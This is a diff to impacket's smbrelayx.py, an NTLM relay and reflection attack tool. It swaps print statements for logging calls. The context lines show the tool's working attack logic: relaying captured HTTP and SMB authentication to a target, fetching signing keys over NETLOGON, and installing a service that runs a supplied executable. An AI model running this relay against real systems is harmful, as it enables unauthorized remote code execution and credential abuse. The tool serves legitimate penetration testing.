@@ -46,10 +46,11 @@ import time
 import argparse
 import SimpleHTTPServer
 import SocketServer
+import logging
 import base64
 
 from impacket import smbserver, smb, ntlm, version
-from impacket.examples import serviceinstall
+from impacket.examples import serviceinstall, logger
 from impacket.spnego import *
 from impacket.smb import *
 from impacket.smbserver import *
@@ -63,8 +64,8 @@ from threading import Thread
 try:
  from Crypto.Cipher import DES, AES, ARC4
 except Exception:
-    print "Warning: You don't have any crypto installed. You need PyCrypto"
-    print "See http://www.pycrypto.org/"
+    logging.critical("Warning: You don't have any crypto installed. You need PyCrypto")
+    logging.critical("See http://www.pycrypto.org/")
 
 class doAttack(Thread):
     def __init__(self, SMBClient, exeFile):
@@ -75,7 +76,7 @@ class doAttack(Thread):
         # Here PUT YOUR CODE!
         result = self.installService.install()
         if result is True:
-            print "[*] Service Installed.. CONNECT!"
+            logging.info("Service Installed.. CONNECT!")
             self.installService.uninstall()
 
 class SMBClient(smb.SMB):
@@ -124,7 +125,7 @@ class SMBClient(smb.SMB):
         try:
             smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
         except:
-            print "[!] Error login_standard"
+            logging.error("Error login_standard")
             return None, STATUS_LOGON_FAILURE
         else:
             self._uid = smb['Uid']
@@ -136,14 +137,14 @@ class SMBClient(smb.SMB):
         self.domainIp = domainIp
         if self._SignatureRequired is True:
             if self.domainIp is None:
-                print "[!] Signature is REQUIRED on the other end, attack will not work"
+                logging.error("Signature is REQUIRED on the other end, attack will not work")
             else:
-                print "[*] Signature is REQUIRED on the other end, using NETLOGON approach"
+                logging.info("Signature is REQUIRED on the other end, using NETLOGON approach")
 
 
     def netlogonSessionKey(self, challenge, authenticateMessageBlob):
         # Here we will use netlogon to get the signing session key
-        print "[*] Connecting to %s NETLOGON service" % self.domainIp
+        logging.info("Connecting to %s NETLOGON service" % self.domainIp)
 
         respToken2 = SPNEGO_NegTokenResp(authenticateMessageBlob)
         authenticateMessage = ntlm.NTLMAuthChallengeResponse()
@@ -226,10 +227,10 @@ class SMBClient(smb.SMB):
         except Exception, e:
             #import traceback
             #print traceback.print_exc()
-            print "[!] %s " % e
+            logging.error(str(e))
             return e.get_error_code()
 
-        print "[*] %s\\%s successfully validated through NETLOGON" % (domainName, authenticateMessage['user_name'].decode('utf-16le'))
+        logging.info("%s\\%s successfully validated through NETLOGON" % (domainName, authenticateMessage['user_name'].decode('utf-16le')))
  
         encryptedSessionKey = authenticateMessage['session_key']
         if encryptedSessionKey != '':
@@ -237,7 +238,7 @@ class SMBClient(smb.SMB):
         else:
             signingKey = resp['ValidationInformation']['ValidationSam4']['UserSessionKey'] 
 
-        print "[*] SMB Signing key: %s " % signingKey.encode('hex')
+        logging.info("SMB Signing key: %s " % signingKey.encode('hex'))
 
         self.set_session_key(signingKey)
 
@@ -283,8 +284,8 @@ class SMBClient(smb.SMB):
             try:
                 errorCode = self.netlogonSessionKey(serverChallenge, authenticateMessageBlob)    
             except:
-                import traceback
-                print traceback.print_exc()
+                #import traceback
+                #print traceback.print_exc()
                 raise
 
         return smb, errorCode
@@ -332,7 +333,7 @@ class SMBClient(smb.SMB):
         try:
             smb.isValidAnswer(SMB.SMB_COM_SESSION_SETUP_ANDX)
         except:
-            print "[!] SessionSetup Error!"
+            logging.error("SessionSetup Error!")
             return None
         else:
             # We will need to use this uid field for all future requests/responses
@@ -363,7 +364,7 @@ class HTTPRelayServer(Thread):
         def __init__(self,request, client_address, server):
             self.server = server
             self.protocol_version = 'HTTP/1.1'
-            print "[*] HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.server.target)
+            logging.info("HTTPD: Received connection from %s, attacking target %s" % (client_address[0] ,self.server.target))
             SimpleHTTPServer.SimpleHTTPRequestHandler.__init__(self,request, client_address, server)
 
         def handle_one_request(self):
@@ -405,7 +406,7 @@ class HTTPRelayServer(Thread):
             if messageType == 1:
                 if self.server.mode.upper() == 'REFLECTION':
                     self.target = self.client_address[0]
-                    print "[*] Downgrading to standard security"
+                    logging.info("Downgrading to standard security")
                     extSec = False
                 else:
                     self.target = self.server.target
@@ -416,8 +417,8 @@ class HTTPRelayServer(Thread):
                     self.client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
                     self.client.set_timeout(60)
                 except Exception, e:
-                   print "[!] Connection against target %s FAILED" % self.target
-                   print e
+                   logging.error("Connection against target %s FAILED" % self.target)
+                   logging.error(str(e))
 
                 clientChallengeMessage = self.client.sendNegotiate(token) 
                 self.challengeMessage = ntlm.NTLMAuthChallenge()
@@ -435,11 +436,11 @@ class HTTPRelayServer(Thread):
                     errorCode = STATUS_ACCESS_DENIED
 
                 if errorCode != STATUS_SUCCESS:
-                    print "[!] Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name'])
+                    logging.error("Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
                     self.do_AUTHHEAD('NTLM')
                 else:
                     # Relay worked, do whatever we want here...
-                    print "[*] Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name'])
+                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
 
                     clientThread = doAttack(self.client,self.server.exeFile)
                     clientThread.start()
@@ -470,7 +471,7 @@ class HTTPRelayServer(Thread):
         self.domainIp = domainIp
 
     def run(self):
-        print "[*] Setting up HTTP Server"
+        logging.info("Setting up HTTP Server")
         self.httpd = self.HTTPServer(("", 80), self.HTTPHandler, self.target, self.exeFile, self.mode)
         self.httpd.serve_forever()
 
@@ -521,14 +522,14 @@ class SMBRelayServer(Thread):
             smbClient = smbData[self.target]['SMBClient']
             del(smbClient)
             del (smbData[self.target])
-        print "[*] SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target)
+        logging.info("SMBD: Received connection from %s, attacking target %s" % (connData['ClientIP'] ,self.target))
         try: 
             if recvPacket['Flags2'] & smb.SMB.FLAGS2_EXTENDED_SECURITY == 0:
                 extSec = False
             else:
                 if self.mode.upper() == 'REFLECTION':
                     # Force standard security when doing reflection
-                    print "[*] Downgrading to standard security"
+                    logging.info("Downgrading to standard security")
                     extSec = False
                     recvPacket['Flags2'] = recvPacket['Flags2'] & ( ~smb.SMB.FLAGS2_EXTENDED_SECURITY )
                 else:
@@ -537,8 +538,8 @@ class SMBRelayServer(Thread):
             client.setDomainAccount(self.machineAccount, self.machineHashes, self.domainIp)
             client.set_timeout(60)
         except Exception, e:
-            print "[!] Connection against target %s FAILED" % self.target
-            print e
+            logging.error("Connection against target %s FAILED" % self.target)
+            logging.error(str(e))
         else: 
             encryptionKey = client.get_encryption_key()
             smbData[self.target] = {} 
@@ -649,12 +650,12 @@ class SMBRelayServer(Thread):
                     packet['ErrorClass']  = errorCode & 0xff
                     # Reset the UID
                     smbClient.setUid(0)
-                    print "[!] Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name'])
+                    logging.error("Authenticating against %s as %s\%s FAILED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
                     #del (smbData[self.target])
                     return None, [packet], errorCode
                 else:
                     # We have a session, create a thread and do whatever we want
-                    print "[*] Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name'])
+                    logging.info("Authenticating against %s as %s\%s SUCCEED" % (self.target,authenticateMessage['domain_name'], authenticateMessage['user_name']))
                     del (smbData[self.target])
                     clientThread = doAttack(smbClient,self.exeFile)
                     clientThread.start()
@@ -748,7 +749,7 @@ class SMBRelayServer(Thread):
         self.server.serve_forever()
 
     def run(self):
-        print "[*] Setting up SMB Server"
+        logging.info("Setting up SMB Server")
         self._start()
 
     def setTargets(self, targets):
@@ -785,15 +786,15 @@ if __name__ == '__main__':
     try:
        options = parser.parse_args()
     except Exception, e:
-       print e
+       logging.error(str(e))
        sys.exit(1)
 
     if options.h is not None:
-        print "[*] Running in relay mode"
+        logging.info("Running in relay mode")
         mode = 'RELAY'
         targetSystem = options.h
     else:
-        print "[*] Running in reflection mode"
+        logging.info("Running in reflection mode")
         targetSystem = None
         mode = 'REFLECTION'
 
@@ -807,12 +808,12 @@ if __name__ == '__main__':
         if options.machine_account is not None and options.machine_hashes is not None and options.domain is not None:
             s.setDomainAccount( options.machine_account,  options.machine_hashes,  options.domain)
         elif (options.machine_account is None and options.machine_hashes is None and options.domain is None) is False:
-            print "[!] You must specify machine-account/hashes/domain all together!"
+            logging.error("You must specify machine-account/hashes/domain all together!")
             sys.exit(1)
         s.start()
         
     print ""
-    print "[*] Servers started, waiting for connections"
+    logging.info("Servers started, waiting for connections")
     while True:
         try:
             sys.stdin.read()
